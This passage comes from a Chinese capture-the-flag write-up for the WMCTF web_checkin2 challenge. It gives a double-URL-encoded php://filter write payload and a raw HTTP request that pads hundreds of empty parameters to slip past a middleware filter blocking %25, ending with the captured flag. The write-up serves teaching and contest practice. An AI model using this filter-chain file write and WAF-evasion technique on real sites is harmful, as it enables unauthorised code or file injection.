alt="image1550"></p><p>php会对filter进行urldecode，美滋滋那么payload出来了</p><p>payload:</p><pre><code>php://filter/write=%2563%256f%256e%2576%2565%2572%2574%252e%2562%2561%2573%2565%2536%2534%252d%2565%256e%2563%256f%2564%2565|%2573%2574%2572%2569%256e%2567%252e%2572%256f%2574%2531%2533|%2563%256f%256e%2576%2565%2572%2574%252e%2562%2561%2573%2565%2536%2534%252d%2564%2565%2563%256f%2564%2565/resource=1%09%0Fc%9DCm0%A3.%A0%FBq%2BS%82%1FQ%28d%8D%1C%07b8%9C%A0%FB%0An</code></pre><p>但是新的问题出现了，这个网站的中间件会ban<code>%25</code>，送出题人一句mmp。</p><p>跨过千山万水来到这里，结果还有新的拦路虎。</p><p>一般遇到服务器中间件拦截%25的时候，我们可以试试php与中间件对数据解析的差异来绕过，或者试试http请求走私，测试后发现两种都不行</p><p>服务器过滤了%25，测试下发现这是是针对参数值的，如把%25放到参数名那里就是很ok的，然后我们就知道他是针对参数检测的，如果参数过多它还能检测吗</p><p>于是有：</p><pre><code>GET /index.php/aaa/?a=&amp;b=&amp;c=&amp;d=&amp;e=&amp;f=&amp;g=&amp;h=&amp;i=&amp;j=&amp;k=&amp;l=&amp;m=&amp;n=&amp;o=&amp;p=&amp;q=&amp;r=&amp;s=&amp;t=&amp;u=&amp;v=&amp;w=&amp;x=&amp;y=&amp;z=&amp;A=&amp;B=&amp;C=&amp;D=&amp;E=&amp;F=&amp;G=&amp;H=&amp;I=&amp;J=&amp;K=&amp;L=&amp;M=&amp;N=&amp;O=&amp;P=&amp;Q=&amp;R=&amp;S=&amp;T=&amp;U=&amp;V=&amp;W=&amp;X=&amp;Y=&amp;Z=&amp;0=&amp;1=&amp;2=&amp;3=&amp;4=&amp;5=&amp;6=&amp;7=&amp;8=&amp;9=&amp;aa=&amp;ab=&amp;ac=&amp;ad=&amp;ae=&amp;af=&amp;ag=&amp;ah=&amp;ai=&amp;aj=&amp;ak=&amp;al=&amp;am=&amp;an=&amp;ao=&amp;ap=&amp;aq=&amp;ar=&amp;as=&amp;at=&amp;au=&amp;av=&amp;aw=&amp;ax=&amp;ay=&amp;az=&amp;aA=&amp;aB=&amp;aC=&amp;aD=&amp;aE=&amp;aF=&amp;aG=&amp;aH=&amp;aI=&amp;aJ=&amp;aK=&amp;aL=&amp;aM=&amp;aN=&amp;aO=&amp;aP=&amp;aQ=&amp;aR=&amp;aS=&amp;aT=&amp;aU=&amp;aV=&amp;aW=&amp;aX=&amp;aY=&amp;aZ=&amp;a0=&amp;a1=&amp;a2=&amp;a3=&amp;a4=&amp;a5=&amp;a6=&amp;a7=&amp;a8=&amp;a9=&amp;ba=&amp;bb=&amp;bc=&amp;bd=&amp;be=&amp;bf=&amp;bg=&amp;bh=&amp;bi=&amp;bj=&amp;bk=&amp;bl=&amp;bm=&amp;bn=&amp;bo=&amp;bp=&amp;bq=&amp;br=&amp;bs=&amp;bt=&amp;bu=&amp;bv=&amp;bw=&amp;bx=&amp;by=&amp;bz=&amp;bA=&amp;bB=&amp;bC=&amp;bD=&amp;bE=&amp;bF=&amp;bG=&amp;bH=&amp;bI=&amp;bJ=&amp;bK=&amp;bL=&amp;bM=&amp;bN=&amp;bO=&amp;bP=&amp;bQ=&amp;bR=&amp;bS=&amp;bT=&amp;bU=&amp;bV=&amp;bW=&amp;bX=&amp;bY=&amp;bZ=&amp;b0=&amp;b1=&amp;b2=&amp;b3=&amp;b4=&amp;b5=&amp;b6=&amp;b7=&amp;b8=&amp;b9=&amp;ca=&amp;cb=&amp;cc=&amp;cd=&amp;ce=&amp;cf=&amp;cg=&amp;ch=&amp;ci=&amp;cj=&amp;ck=&amp;cl=&amp;cm=&amp;cn=&amp;co=&amp;cp=&amp;cq=&amp;cr=&amp;cs=&amp;ct=&amp;cu=&amp;cv=&amp;cw=&amp;cx=&amp;cy=&amp;cz=&amp;cA=&amp;cB=&amp;cC=&amp;cD=&amp;cE=&amp;cF=&amp;cG=&amp;cH=&amp;cI=&amp;content=php://filter/write=%2563%256f%256e%2576%2565%2572%2574%252e%2562%2561%2573%2565%2536%2534%252d%2565%256e%2563%256f%2564%2565|%2573%2574%2572%2569%256e%2567%252e%2572%256f%2574%2531%2533|%2563%256f%256e%2576%2565%2572%2574%252e%2562%2561%2573%2565%2536%2534%252d%2564%2565%2563%256f%2564%2565/resource=1%09%0Fc%9DCm0%A3.%A0%FBq%2BS%82%1FQ%28d%8D%1C%07b8%9C%A0%FB%0An&amp;cJ=&amp;cK=&amp;cL=&amp;cM=&amp;cN=&amp;cO=&amp;cP=&amp;cQ=&amp;cR=&amp;cS=&amp;cT=&amp;cU=&amp;cV=&amp;cW=&amp;cX=&amp;cY=&amp;cZ=&amp;c0=&amp;c1=&amp;c2=&amp;c3=&amp;c4=&amp;c5=&amp;c6=&amp;c7=&amp;c8=&amp;c9=&amp;da=&amp;db=&amp;dc=&amp;dd=&amp;de=&amp;df=&amp;dg=&amp;dh=&amp;di=&amp;dj=&amp;dk=&amp;dl=&amp;dm=&amp;dn=&amp;do=&amp;dp=&amp;dq=&amp;dr=&amp;ds=&amp;dt=&amp;du=&amp;dv=&amp;dw=&amp;dx=&amp;dy=&amp;dz=&amp;dA=&amp;dB=&amp;dC=&amp;dD=&amp;dE=&amp;dF=&amp;dG=&amp;dH=&amp;dI=&amp;dJ=&amp;dK=&amp;dL=&amp;dM=&amp;dN=&amp;dO=&amp;dP=&amp;dQ=&amp;dR=&amp;dS=&amp;dT=&amp;dU=&amp;dV=&amp;dW=&amp;dX=&amp;dY=&amp;dZ=&amp;d0=&amp;d1=&amp;d2=&amp;d3=&amp;d4=&amp;d5=&amp;d6=&amp;d7=&amp;d8=&amp;d9=&amp;ea=&amp;eb=&amp;ec=&amp;ed=&amp;ee=&amp;ef=&amp;eg=&amp;eh=&amp;ei=&amp;ej=&amp;ek=&amp;el=&amp;em=&amp;en=&amp;eo=&amp;ep=&amp;eq=&amp;er=&amp;es=&amp;et=&amp;eu=&amp;ev=&amp;ew=&amp;ex=&amp;ey=&amp;ez=&amp;eA=&amp;eB=&amp;eC=&amp;eD=&amp;eE=&amp;eF=&amp;eG=&amp;eH=&amp;eI=&amp;eJ=&amp;eK=&amp;eL=&amp;eM=&amp;eN=&amp;eO=&amp;eP=&amp;eQ=&amp;eR=&amp;eS=&amp;eT=&amp;eU=&amp;eV=&amp;eW=&amp;eX=&amp;eY=&amp;eZ=&amp;e0=&amp;e1=&amp;e2=&amp;e3=&amp;e4=&amp;e5=&amp;e6=&amp;e7=&amp;e8=&amp;e9=&amp;fa=&amp;fb=&amp;fc=&amp;fd=&amp;fe=&amp;ff=&amp;fg=&amp;fh=&amp;fi=&amp;fj=&amp;fk=&amp;fl=&amp;fm=&amp;fn=&amp;fo=&amp;fp=&amp;fq=&amp;fr=&amp;fs=&amp;ft=&amp;fu=&amp;fv=&amp;fw=&amp;fx=&amp;fy=&amp;fz=&amp;fA=&amp;fB=&amp;fC=&amp;fD=&amp;fE=&amp;fF=&amp;fG=&amp;fH=&amp;fI=&amp;fJ=&amp;fK=&amp;fL=&amp;fM=&amp;fN=&amp;fO=&amp;fP=&amp;fQ=&amp;fR=&amp;fS=&amp;fT=&amp;fU=&amp;fV=&amp;fW=&amp;fX=&amp;fY=&amp;fZ=&amp;f0=&amp;f1=&amp;f2=&amp;f3=&amp;f4=&amp;f5=&amp;f6=&amp;f7=&amp;f8=&amp;f9=&amp;ga=&amp;gb=&amp;gc=&amp;gd=&amp;ge=&amp;gf=&amp;gg=&amp;gh=&amp;gi=&amp;gj=&amp;gk=&amp;gl=&amp;gm=&amp;gn=&amp;go=&amp;gp=&amp;gq=&amp;gr=&amp;gs=&amp;gt=&amp;gu=&amp;gv=&amp;gw=&amp;gx=&amp;gy=&amp;gz=&amp;gA=&amp;gB=&amp;gC=&amp;gD=&amp;gE=&amp;gF=&amp;gG=&amp;gH=&amp;gI=&amp;gJ=&amp;gK=&amp;gL=&amp;gM=&amp;gN=&amp;gO=&amp;gP=&amp;gQ=&amp;gR=&amp;gS=&amp;gT=&amp;gU=&amp;gV=&amp;gW=&amp;gX=&amp;gY=&amp;gZ=&amp;g0=&amp;g1=&amp;g2=&amp;g3=&amp;g4=&amp;g5=&amp;g6=&amp;g7=&amp;g8=&amp;g9=&amp;ha=&amp;hb=&amp;hc=&amp;hd=&amp;he=&amp;hf=&amp;hg=&amp;hh=&amp;hi=&amp;hj=&amp;hk=&amp;hl=&amp;hm=&amp;hn=&amp;ho=&amp;hp=&amp;hq=&amp;hr=&amp;hs=&amp;ht=&amp;hu=&amp;hv=&amp;hw=&amp;hx=&amp;hy=&amp;hz=&amp;hA=&amp;hB=&amp;hC=&amp;hD=&amp;hE=&amp;hF=&amp;hG=&amp;hH=&amp;hI=&amp;hJ=&amp;hK=&amp;hL=&amp;hM=&amp;hN=&amp;hO=&amp;hP=&amp;hQ=&amp;hR=&amp;hS=&amp;hT=&amp;hU=&amp;hV=&amp;hW=&amp;hX=&amp;hY=&amp;hZ=&amp;h0=&amp;h1=&amp;h2=&amp;h3=&amp;h4=&amp;h5=&amp;h6=&amp;h7=&amp;h8=&amp;h9=&amp;ia=&amp;ib=&amp;ic=&amp;id=&amp;ie=&amp;if=&amp;ig=&amp;ih=&amp;ii=&amp;ij=&amp;ik=&amp;il=&amp;im=&amp;in=&amp;io=&amp;ip=&amp;iq=&amp;ir=&amp;is=&amp;it=&amp;iu=&amp;iv=&amp;iw=&amp;ix=&amp;iy=&amp;iz=&amp;iA=&amp;iB=&amp;iC=&amp;iD=&amp;iE=&amp;iF=&amp;iG=&amp;iH=&amp;iI=&amp;iJ=&amp;iK=&amp;iL=&amp;iM=&amp;iN=&amp;iO=&amp;iP=&amp;iQ=&amp;iR=&amp;iS=&amp;iT=&amp;iU=&amp;iV=&amp;iW=&amp;iX=&amp;iY=&amp;iZ=&amp;i0=&amp;i1=&amp;i2=&amp;i3=&amp;i4=&amp;i5=&amp;i6=&amp;i7=&amp;i8=&amp;i9=&amp;ja=&amp;jb=&amp;jc=&amp;jd=&amp;je=&amp;jf=&amp;jg=&amp;jh=&amp;ji=&amp;jj=&amp;jk=&amp;jl=&amp;jm=&amp;jn=&amp;jo=&amp;jp=&amp;jq=&amp;jr=&amp;js=&amp;jt=&amp;ju=&amp;jv=&amp;jw=&amp;jx=&amp;jy=&amp;jz=&amp;jA=&amp;jB=&amp;jC=&amp;jD=&amp;jE=&amp;jF=&amp;jG=&amp;jH=&amp;jI=&amp;jJ=&amp;jK=&amp;jL=&amp;jM=&amp;jN=&amp;jO=&amp;jP=&amp;jQ=&amp;jR=&amp;jS=&amp;jT=&amp;jU=&amp;jV=&amp;jW=&amp;jX=&amp;jY=&amp;jZ=&amp;j0=&amp;j1=&amp;j2=&amp;j3=&amp;j4=&amp;j5=&amp;j6=&amp;j7=&amp;j8=&amp;j9=&amp;ka=&amp;kb=&amp;kc=&amp;kd=&amp;ke=&amp;kf=&amp;kg=&amp;kh=&amp;ki=&amp;kj=&amp;kk=&amp;kl=&amp;km=&amp;kn=&amp;ko=&amp;kp=&amp;kq=&amp;kr=&amp;ks=&amp;kt=&amp;ku=&amp;kv=&amp;kw=&amp;kx=&amp;ky=&amp;kz=&amp;kA=&amp;kB=&amp;kC=&amp;kD=&amp;kE=&amp;kF=&amp;kG=&amp;kH=&amp;kI=&amp;kJ=&amp;kK=&amp;kL=&amp;kM=&amp;kN=&amp;kO=&amp;kP=&amp;kQ=&amp;kR=&amp;kS=&amp;kT=&amp;kU=&amp;kV=&amp;kW=&amp;kX=&amp;kY=&amp;kZ=&amp;k0=&amp;k1=&amp;k2=&amp;k3=&amp;k4=&amp;k5=&amp;k6=&amp;k7=&amp;k8=&amp;k9=&amp;la=&amp;lb=&amp;lc=&amp;ld=&amp;le=&amp;lf=&amp;lg=&amp;lh=&amp;li=&amp;lj=&amp;lk=&amp;ll=&amp;lm=&amp;ln=&amp;lo=&amp;lp=&amp;lq=&amp;lr=&amp;ls=&amp;lt=&amp;lu=&amp;lv=&amp;lw=&amp;lx=&amp;ly=&amp;lz=&amp;lA=&amp;lB=&amp;lC=&amp;lD=&amp;lE=&amp;lF=&amp;lG=&amp;lH=&amp;lI=&amp;lJ=&amp;lK=&amp;lL=&amp;lM=&amp;lN=&amp;lO=&amp;lP=&amp;lQ=&amp;lR=&amp;lS=&amp;lT=&amp;lU=&amp;lV=&amp;lW=&amp;lX=&amp;lY=&amp;lZ=&amp;l0=&amp;l1=&amp;l2=&amp;l3=&amp;l4=&amp;l5=&amp;l6=&amp;l7=&amp;l8=&amp;l9=&amp;ma=&amp;mb=&amp;mc=&amp;md=&amp;me=&amp;mf=&amp;mg=&amp;mh=&amp;mi=&amp;mj=&amp;mk=&amp;ml=&amp;mm=&amp;mn=&amp;mo=&amp;mp=&amp;mq=&amp;mr=&amp;ms=&amp;mt=&amp;mu=&amp;mv=&amp;mw=&amp;mx=&amp;my=&amp;mz=&amp;mA=&amp;mB=&amp;mC=&amp;mD=&amp;mE=&amp;mF=&amp;mG=&amp;mH=&amp;mI=&amp;mJ=&amp;mK=&amp;mL=&amp;mM=&amp;mN=&amp;mO=&amp;mP=&amp;mQ=&amp;mR=&amp;mS=&amp;mT=&amp;mU=&amp;mV=&amp;mW=&amp;mX=&amp;mY=&amp;mZ=&amp;m0=&amp;m1=&amp;m2=&amp;m3=&amp;m4=&amp;m5=&amp;m6=&amp;m7=&amp;m8=&amp;m9=&amp;na=&amp;nb=&amp;nc=&amp;nd=&amp;ne=&amp;nf=&amp;ng=&amp;nh=&amp;ni=&amp;nj=&amp;nk=&amp;nl=&amp;nm=&amp;nn=&amp;no=&amp;np=&amp;nq=&amp;nr=&amp;ns=&amp;nt=&amp;nu=&amp;nv=&amp;nw=&amp;nx=&amp;ny=&amp;nz=&amp;nA=&amp;nB=&amp;nC=&amp;nD=&amp;nE=&amp;nF=&amp;nG=&amp;nH=&amp;nI=&amp;nJ=&amp;nK=&amp;nL=&amp;nM=&amp;nN=&amp;nO=&amp;nP=&amp;nQ=&amp;nR=&amp;nS=&amp;nT=&amp;nU=&amp;nV=&amp;nW=&amp;nX=&amp;nY=&amp;nZ=&amp;n0=&amp;n1=&amp;n2=&amp;n3=&amp;n4=&amp;n5=&amp;n6=&amp;n7=&amp;n8=&amp;n9=&amp;oa=&amp;ob=&amp;oc=&amp;od=&amp;oe=&amp;of=&amp;og=&amp;oh=&amp;oi=&amp;oj=&amp;ok=&amp;ol=&amp;om=&amp;on=&amp;oo=&amp;op=&amp;oq=&amp;or=&amp;os=&amp;ot=&amp;ou=&amp;ov=&amp;ow=&amp;ox=&amp;oy=&amp;oz=&amp;oA=&amp;oB=&amp;oC=&amp;oD=&amp;oE=&amp;oF=&amp;oG=&amp;oH=&amp;oI=&amp;oJ=&amp;oK=&amp;oL=&amp;oM=&amp;oN=&amp;oO=&amp;oP=&amp;oQ=&amp;oR=&amp;oS=&amp;oT=&amp;oU=&amp;oV=&amp;oW=&amp;oX=&amp;oY=&amp;oZ=&amp;o0=&amp;o1=&amp;o2=&amp;o3=&amp;o4=&amp;o5=&amp;o6=&amp;o7=&amp;o8=&amp;o9=&amp;pa=&amp;pb=&amp;pc=&amp;pd=&amp;pe=&amp;pf=&amp;pg=&amp;ph=&amp;pi=&amp;pj=&amp;pk=&amp;pl=&amp;pm=&amp;pn=&amp;po=&amp;pp=&amp;pq=&amp;pr=&amp;ps=&amp;pt=&amp;pu=&amp;pv=&amp;pw=&amp;px=&amp;py=&amp;pz=&amp;pA=&amp;pB=&amp;pC=&amp;pD=&amp;pE=&amp;pF=&amp;pG=&amp;pH=&amp;pI=&amp;pJ=&amp;pK=&amp;pL=&amp;pM=&amp;pN=&amp;pO=&amp;pP=&amp;pQ=&amp;pR=&amp;pS=&amp;pT=&amp;pU=&amp;pV=&amp;pW=&amp;pX=&amp;pY=&amp;pZ=&amp;p0=&amp;p1=&amp;p2=&amp;p3=&amp;p4=&amp;p5=&amp;p6=&amp;p7=&amp;p8=&amp;p9=&amp;qa=&amp;qb=&amp;qc=&amp;qd=&amp;qe=&amp;qf=&amp;qg=&amp;qh=&amp;qi=&amp;qj=&amp;qk=&amp;ql=&amp;qm=&amp;qn=&amp;qo=&amp;qp=&amp;qq=&amp;qr=&amp;qs=&amp;qt=&amp;qu=&amp;qv=&amp;qw=&amp;qx=&amp;qy=&amp;qz=&amp;qA=&amp;qB=&amp;qC=&amp;qD=&amp;qE=&amp;qF=&amp;qG=&amp;qH=&amp;qI=&amp;qJ=&amp;qK=&amp;qL=&amp;qM=&amp;qN=&amp;qO=&amp;qP=&amp;qQ=&amp;qR=&amp;qS=&amp;qT=&amp;qU=&amp;qV=&amp;qW=&amp;qX=&amp;qY=&amp;qZ=&amp;q0=&amp;q1=&amp;q2=&amp;q3=&amp;q4=&amp;q5=&amp;q6=&amp;q7=&amp;q8=&amp;q9=&amp;ra=&amp;rb=&amp;rc=&amp;rd=&amp;re=&amp;rf=&amp;rg=&amp;rh=&amp;ri=&amp;rj=&amp;rk=&amp;rl=&amp;rm=&amp;rn=&amp;ro=&amp;rp=&amp;rq=&amp;rr=&amp;rs=&amp;rt=&amp;ru=&amp;rv=&amp;rw=&amp;rx=&amp;ry=&amp;rz=&amp;rA=&amp;rB=&amp;rC=&amp;rD=&amp;rE=&amp;rF=&amp;rG=&amp;rH=&amp;rI=&amp;rJ=&amp;rK=&amp;rL=&amp;rM=&amp;rN=&amp;rO=&amp;rP=&amp;rQ=&amp;rR=&amp;rS=&amp;rT=&amp;rU=&amp;rV=&amp;rW=&amp;rX=&amp;rY=&amp;rZ=&amp;r0=&amp;r1=&amp;r2=&amp;r3=&amp;r4=&amp;r5=&amp;r6=&amp;r7=&amp;r8=&amp;r9=&amp;sa=&amp;sb=&amp;sc=&amp;sd=&amp;se=&amp;sf=&amp;sg=&amp;sh=&amp;si=&amp;sj=&amp;sk=&amp;sl=&amp;sm=&amp;sn=&amp;so=&amp;sp=&amp;sq=&amp;sr=&amp;ss=&amp;st=&amp;su=&amp;sv=&amp;sw=&amp;sx=&amp;sy=&amp;sz=&amp;sA=&amp;sB=&amp;sC=&amp;sD=&amp;sE=&amp;sF=&amp;sG=&amp;sH=&amp;sI=&amp;sJ=&amp;sK=&amp;sL=&amp;sM=&amp;sN=&amp;sO=&amp;sP=&amp;sQ=&amp;sR=&amp;sS=&amp;sT=&amp;sU=&amp;sV=&amp;sW=&amp;sX=&amp;sY=&amp;sZ=&amp;s0=&amp;s1=&amp;s2=&amp;s3=&amp;s4=&amp;s5=&amp;s6=&amp;s7=&amp;s8=&amp;s9=&amp;ta=&amp;tb=&amp;tc=&amp;td=&amp;te=&amp;tf=&amp;tg=&amp;th=&amp;ti=&amp;tj=&amp;tk=&amp;tl=&amp;tm=&amp;tn=&amp;to=&amp;tp=&amp;tq=&amp;tr=&amp;ts=&amp;tt=&amp;tu=&amp;tv=&amp;tw=&amp;tx=&amp;ty=&amp;tz=&amp;tA=&amp;tB=&amp;tC=&amp;tD=&amp;tE=&amp;tF=&amp;tG=&amp;tH=&amp;tI=&amp;tJ=&amp;tK=&amp;tL=&amp;tM=&amp;tN=&amp;tO=&amp;tP=&amp;tQ=&amp;tR=&amp;tS=&amp;tT=&amp;tU=&amp;tV=&amp;tW=&amp;tX=&amp;tY=&amp;tZ=&amp;t0=&amp;t1=&amp;t2=&amp;t3=&amp;t4=&amp;t5=&amp;t6=&amp;t7=&amp;t8=&amp;t9=&amp;ua=&amp;ub=&amp;uc=&amp;ud=&amp;ue=&amp;uf=&amp;ug=&amp;uh=&amp;ui=&amp;uj=&amp;uk=&amp;ul=&amp;um=&amp;un=&amp;uo=&amp;up=&amp;uq=&amp;ur=&amp;us=&amp;ut=&amp;uu=&amp;uv=&amp;uw=&amp;ux=&amp;uy=&amp;uz=&amp;uA=&amp;uB=&amp;uC=&amp;uD=&amp;uE=&amp;uF=&amp;uG=&amp;uH=&amp;uI=&amp;uJ=&amp;uK=&amp;uL=&amp;uM=&amp;uN=&amp;uO=&amp;uP=&amp;uQ=&amp;uR=&amp;uS=&amp;uT=&amp;uU=&amp;uV=&amp;uW=&amp;uX=&amp;uY=&amp;uZ=&amp;u0=&amp;u1=&amp;u2=&amp;u3=&amp;u4=&amp;u5=&amp;u6=&amp;u7=&amp;u8=&amp;u9=&amp;va=&amp;vb=&amp;vc=&amp;vd=&amp;ve=&amp;vf=&amp;vg=&amp;vh=&amp;vi=&amp;vj=&amp;vk=&amp;vl=&amp;vm=&amp;vn=&amp;vo=&amp;vp=&amp;vq=&amp;vr=&amp;vs=&amp;vt=&amp;vu=&amp;vv=&amp;vw=&amp;vx=&amp;vy=&amp;vz=&amp;vA=&amp;vB=&amp;vC=&amp;vD=&amp;vE=&amp;vF=&amp;vG=&amp;vH=&amp;vI=&amp;vJ=&amp;vK=&amp;vL=&amp;vM=&amp;vN=&amp;vO=&amp;vP=&amp;vQ=&amp;vR=&amp;vS=&amp;vT=&amp;vU=&amp;vV=&amp;vW=&amp;vX=&amp;vY=&amp;vZ=&amp;v0=&amp;v1=&amp;v2=&amp;v3=&amp;v4=&amp;v5=&amp;v6=&amp;v7=&amp;v8=&amp;v9=&amp;wa=&amp;wb=&amp;wc=&amp;wd=&amp;we=&amp;wf=&amp;wg=&amp;wh=&amp;wi=&amp;wj=&amp;wk=&amp;wl=&amp;wm=&amp;wn=&amp;wo=&amp;wp=&amp;wq=&amp;wr=&amp;ws=&amp;wt=&amp;wu=&amp;wv=&amp;ww=&amp;wx=&amp;wy=&amp;wz=&amp;wA=&amp;wB=&amp;wC=&amp;wD=&amp;wE=&amp;wF=&amp;wG=&amp;wH=&amp;wI=&amp;wJ=&amp;wK=&amp;wL=&amp;wM=&amp;wN=&amp;wO=&amp;wP=&amp;wQ=&amp;wR=&amp;wS=&amp;wT=&amp;wU=&amp;wV=&amp;wW=&amp;wX=&amp;wY=&amp;wZ=&amp;w0=&amp;w1=&amp;w2=&amp;w3=&amp;w4=&amp;w5=&amp;w6=&amp;w7=&amp;w8=&amp;w9=&amp;xa=&amp;xb=&amp;xc=&amp;xd=&amp;xe=&amp;xf=&amp;xg=&amp;xh=&amp;xi=&amp;xj=&amp;xk=&amp;xl=&amp;xm=&amp;xn=&amp;xo=&amp;xp=&amp;xq=&amp;xr=&amp;xs=&amp;xt=&amp;xu=&amp;xv=&amp;xw=&amp;xx=&amp;xy=&amp;xz=&amp;xA=&amp;xB=&amp;xC=&amp;xD=&amp;xE=&amp;xF=&amp;xG=&amp;xH=&amp;xI=&amp;xJ=&amp;xK=&amp;xL=&amp;xM=&amp;xN=&amp;xO=&amp;xP=&amp;xQ=&amp;xR=&amp;xS=&amp;xT=&amp;xU=&amp;xV=&amp;xW=&amp;xX=&amp;xY=&amp;xZ=&amp;x0=&amp;x1=&amp;x2=&amp;x3=&amp;x4=&amp;x5=&amp;x6=&amp;x7=&amp;x8=&amp;x9=&amp;ya=&amp;yb=&amp;yc=&amp;yd=&amp;ye=&amp;yf=&amp;yg=&amp;yh=&amp;yi=&amp;yj=&amp;yk=&amp;yl=&amp;ym=&amp;yn=&amp;yo=&amp;yp=&amp;yq=&amp;yr=&amp;ys=&amp;yt=&amp;yu=&amp;yv=&amp;yw=&amp;yx=&amp;yy=&amp;yz=&amp;yA=&amp;yB=&amp;yC=&amp;yD=&amp;yE=&amp;yF=&amp;yG=&amp;yH=&amp;yI=&amp;yJ=&amp;yK=&amp;yL=&amp;yM=&amp;yN=&amp;yO=&amp;yP=&amp;yQ=&amp;yR=&amp;yS=&amp;yT=&amp;yU=&amp;yV=&amp;yW=&amp;yX=&amp;yY=&amp;yZ=&amp;y0=&amp;y1=&amp;y2=&amp;y3=&amp;y4=&amp;y5=&amp;y6=&amp;y7=&amp;y8=&amp;y9=&amp;za=&amp;zb=&amp;zc=&amp;zd=&amp;ze=&amp;zf=&amp;zg=&amp;zh=&amp;zi=&amp;zj=&amp;zk=&amp;zl=&amp;zm=&amp;zn=&amp;zo=&amp;zp=&amp;zq=&amp;zr=&amp;zs=&amp;zt=&amp;zu=&amp;zv=&amp;zw=&amp;zx=&amp;zy=&amp;zz=&amp;zA=&amp;zB=&amp;zC=&amp;zD=&amp;zE=&amp;zF=&amp;zG=&amp;zH=&amp;zI=&amp;zJ=&amp;zK=&amp;zL=&amp;zM=&amp;zN=&amp;zO=&amp;zP=&amp;zQ=&amp;zR=&amp;zS=&amp;zT=&amp;zU=&amp;zV=&amp;zW=&amp;zX=&amp;zY=&amp;zZ=&amp;z0=&amp;z1=&amp;z2=&amp;z3=&amp;z4=&amp;z5=&amp;z6=&amp;z7=&amp;z8=&amp;z9=&amp;Aa=&amp;Ab=&amp;Ac=&amp;Ad=&amp;Ae=&amp;Af=&amp;Ag=&amp;Ah=&amp;Ai=&amp;Aj=&amp;Ak=&amp;Al=&amp;Am=&amp;An=&amp;Ao=&amp;Ap=&amp;Aq=&amp;Ar=&amp;As=&amp;At=&amp;Au=&amp;Av=&amp;Aw=&amp;Ax=&amp;Ay=&amp;Az=&amp;AA=&amp;AB=&amp;AC=&amp;AD=&amp;AE=&amp;AF=&amp;AG=&amp;AH=&amp;AI=&amp;AJ=&amp;AK=&amp;AL=&amp;AM=&amp;AN=&amp;AO=&amp;AP=&amp;AQ=&amp;AR=&amp;AS=&amp;AT=&amp;AU=&amp;AV=&amp;AW=&amp;AX=&amp;AY=&amp;AZ=&amp;A0=&amp;A1=&amp;A2=&amp;A3=&amp;A4=&amp;A5=&amp;A6=&amp;A7=&amp;A8=&amp;A9=&amp;Ba=&amp;Bb=&amp;Bc=&amp;Bd=&amp;Be=&amp;Bf=&amp;Bg=&amp;Bh=&amp;Bi=&amp;Bj=&amp;Bk=&amp;Bl=&amp;Bm=&amp;Bn=&amp;Bo=&amp;Bp=&amp;Bq=&amp;Br=&amp;Bs=&amp;Bt=&amp;Bu=&amp;Bv=&amp;Bw=&amp;Bx=&amp;By=&amp;Bz=&amp;BA=&amp;BB=&amp;BC=&amp;BD=&amp;BE=&amp;BF=&amp;BG=&amp;BH=&amp;BI=&amp;BJ=&amp;BK=&amp;BL=&amp;BM=&amp;BN=&amp;BO=&amp;BP=&amp;BQ=&amp;BR=&amp;BS=&amp;BT=&amp;BU=&amp;BV=&amp;BW=&amp;BX=&amp;BY=&amp;BZ=&amp;B0=&amp;B1=&amp;B2=&amp;B3=&amp;B4=&amp;B5=&amp;B6=&amp;B7=&amp;B8=&amp;B9=&amp;Ca=&amp;Cb=&amp;Cc=&amp;Cd=&amp;Ce=&amp;Cf=&amp;Cg=&amp;Ch=&amp;Ci=&amp;Cj=&amp;Ck=&amp;Cl=&amp;Cm=&amp;Cn=&amp;Co=&amp;Cp=&amp;Cq=&amp;Cr=&amp;Cs=&amp;Ct=&amp;Cu=&amp;Cv=&amp;Cw=&amp;Cx=&amp;Cy=&amp;Cz=&amp;CA=&amp;CB=&amp;CC=&amp;CD=&amp;CE=&amp;CF=&amp;CG=&amp;CH=&amp;CI=&amp;CJ=&amp;CK=&amp;CL=&amp;CM=&amp;CN=&amp;CO=&amp;CP=&amp;CQ=&amp;CR=&amp;CS=&amp;CT=&amp;CU=&amp;CV=&amp;CW=&amp;CX=&amp;CY=&amp;CZ=&amp;C0=&amp;C1=&amp;C2=&amp;C3=&amp;C4=&amp;C5=&amp;C6=&amp;C7=&amp;C8=&amp;C9=&amp;Da=&amp;Db=&amp;Dc=&amp;Dd=&amp;De=&amp;Df=&amp;Dg=&amp;Dh=&amp;Di=&amp;Dj=&amp;Dk=&amp;Dl=&amp;Dm=&amp;Dn=&amp;Do=&amp;Dp=&amp;Dq=&amp;Dr=&amp;Ds=&amp;Dt=&amp;Du=&amp;Dv=&amp;Dw=&amp;Dx=&amp;Dy=&amp;Dz=&amp;DA=&amp;DB=&amp;DC=&amp;DD=&amp;DE=&amp;DF=&amp;DG=&amp;DH=&amp;DI=&amp;DJ=&amp;DK=&amp;DL=&amp;DM=&amp;DN=&amp;DO=&amp;DP=&amp;DQ=&amp;DR=&amp;DS=&amp;DT=&amp;DU=&amp;DV=&amp;DW=&amp;DX=&amp;DY=&amp;DZ=&amp;D0=&amp;D1=&amp;D2=&amp;D3=&amp;D4=&amp;D5=&amp;D6=&amp;D7=&amp;D8=&amp;D9=&amp;Ea=&amp;Eb=&amp;Ec=&amp;Ed=&amp;Ee=&amp;Ef=&amp;Eg=&amp;Eh=&amp;Ei=&amp;Ej=&amp;Ek=&amp;El=&amp;Em=&amp;En=&amp;Eo=&amp;Ep=&amp;Eq=&amp;Er=&amp;Es=&amp;Et=&amp;Eu=&amp;Ev=&amp;Ew=&amp;Ex=&amp;Ey=&amp;Ez=&amp;EA=&amp;EB=&amp;EC=&amp;ED=&amp;EE=&amp;EF=&amp;EG=&amp;EH=&amp;EI=&amp;EJ=&amp;EK=&amp;EL=&amp;EM=&amp;EN= HTTP/1.1Host: web_checkin2.wmctf.wetolink.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Connection: close</code></pre><p>测试发现，就如我们猜想的一样。</p><p>访问<code>http://web_checkin2.wmctf.wetolink.com/?content=1%09%0Fc%9DCm0%A3.%A0%FBq%2BS%82%1FQ%28d%8D%1C%07b8%9C%A0%FB%0An</code><br>拿到flag:<code>WMCTF{3C5E9715-5BEE-4D33-8627-DE10E5D92715}</code></p><h2 id="webweb"><a href="#webweb" 